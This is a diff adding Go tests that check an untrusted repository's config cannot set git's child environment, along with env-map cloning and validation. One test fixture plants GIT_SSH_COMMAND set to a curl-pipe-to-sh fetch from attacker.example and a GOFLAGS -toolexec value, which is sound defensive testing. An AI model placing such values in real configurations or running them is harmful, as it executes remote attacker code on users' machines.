@@ -613,3 +613,115 @@ func TestDroppedBranchWarning_NamesWhatIsLost(t *testing.T) {
 		}
 	}
 }
+
+// TestLoadProject_GitEnvNeedsTrust pins the [git] env trust boundary. The git
+// child's environment is a code-execution channel — GIT_SSH_COMMAND names a
+// command git runs on every fetch and push — and a cloned repository ships
+// .plumb/config.toml, so an untrusted project must not be able to set it. The
+// knob lives inside [git] precisely so forceCapabilityFieldsToBase's whole-block
+// reset covers it; this test is what proves that reasoning holds in code rather
+// than only in the comment.
+func TestLoadProject_GitEnvNeedsTrust(t *testing.T) {
+	const payload = `
+[git]
+env = { GIT_SSH_COMMAND = "sh -c 'curl attacker.example/x | sh'", GOFLAGS = "-toolexec=/tmp/evil" }
+`
+	ws := t.TempDir()
+	plumbDir := filepath.Join(ws, ".plumb")
+	if err := os.MkdirAll(plumbDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(plumbDir, "config.toml"), []byte(payload), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	store := tempTrustStore(t)
+
+	// 1. Untrusted: the request is forced back, so nothing of it survives.
+	got, err := LoadProject(defaults, ws)
+	if err != nil {
+		t.Fatalf("LoadProject: %v", err)
+	}
+	if len(got.Git.Env) != 0 {
+		t.Errorf("an untrusted project config must not set the git child environment, got %v", got.Git.Env)
+	}
+
+	// 2. It is nonetheless DISCLOSED, so `plumb trust` shows what is being asked
+	//    for. A key that is silently dropped is the same defect in the other
+	//    direction: it would let a trusted repo add this key later without
+	//    invalidating the grant.
+	spec, err := ProjectPolicySpecFor(ws)
+	if err != nil {
+		t.Fatalf("ProjectPolicySpecFor: %v", err)
+	}
+	var entry *PolicyEntry
+	for i := range spec {
+		if strings.EqualFold(spec[i].Key, "git.env") {
+			entry = &spec[i]
+		}
+	}
+	if entry == nil {
+		t.Fatalf("git.env must appear in the trust spec, got keys %v", spec.Keys())
+	}
+	if w := entry.Warning(defaults); w == "" {
+		t.Error("git.env must carry a warning at trust time — no value of it is safe to wave through")
+	}
+	if desc := strings.Join(spec.Describe(), "\n"); !strings.Contains(desc, "GIT_SSH_COMMAND") {
+		t.Errorf("the disclosure must show the VALUES being asked for, got %q", desc)
+	}
+
+	// 3. Trusted for this exact content: honoured.
+	trustWorkspace(t, store, ws)
+	got, err = LoadProject(defaults, ws)
+	if err != nil {
+		t.Fatalf("LoadProject (trusted): %v", err)
+	}
+	if got.Git.Env["GOFLAGS"] != "-toolexec=/tmp/evil" {
+		t.Errorf("a trusted project config should set the git child environment, got %v", got.Git.Env)
+	}
+}
+
+// TestForceCapabilityFieldsToBase_ClonesGitEnv guards the aliasing hazard the
+// whole-struct `merged.Git = base.Git` assignment introduces once [git] holds a
+// map: LoadProject's caller usually keeps base in a live config store, so a
+// shared map would let one project's merged view mutate every other's.
+func TestForceCapabilityFieldsToBase_ClonesGitEnv(t *testing.T) {
+	base := Defaults()
+	base.Git.Env = map[string]string{"GOWORK": "off"}
+	merged := Defaults()
+
+	forceCapabilityFieldsToBase(base, &merged)
+
+	if merged.Git.Env["GOWORK"] != "off" {
+		t.Fatalf("the forced-back env should be base's, got %v", merged.Git.Env)
+	}
+	merged.Git.Env["GOWORK"] = "mutated"
+	if base.Git.Env["GOWORK"] != "off" {
+		t.Error("the forced-back env must not share backing storage with base")
+	}
+}
+
+// TestValidateGit_RejectsUnusableEnvNames pins that a name which cannot survive
+// the trip into a KEY=VALUE environment slice is refused at load, rather than
+// silently landing the value on a different variable than the one written.
+func TestValidateGit_RejectsUnusableEnvNames(t *testing.T) {
+	cases := map[string]map[string]string{
+		"empty name":     {"": "x"},
+		"name with =":    {"A=B": "x"},
+		"name with NUL":  {"A\x00B": "x"},
+		"value with NUL": {"A": "x\x00y"},
+	}
+	for name, env := range cases {
+		t.Run(name, func(t *testing.T) {
+			cfg := Defaults()
+			cfg.Git.Env = env
+			if err := validate(cfg); err == nil {
+				t.Errorf("validate must reject %q", env)
+			}
+		})
+	}
+	ok := Defaults()
+	ok.Git.Env = map[string]string{"GOWORK": "off", "EMPTY": ""}
+	if err := validate(ok); err != nil {
+		t.Errorf("a well-formed env must validate, got %v", err)
+	}
+}
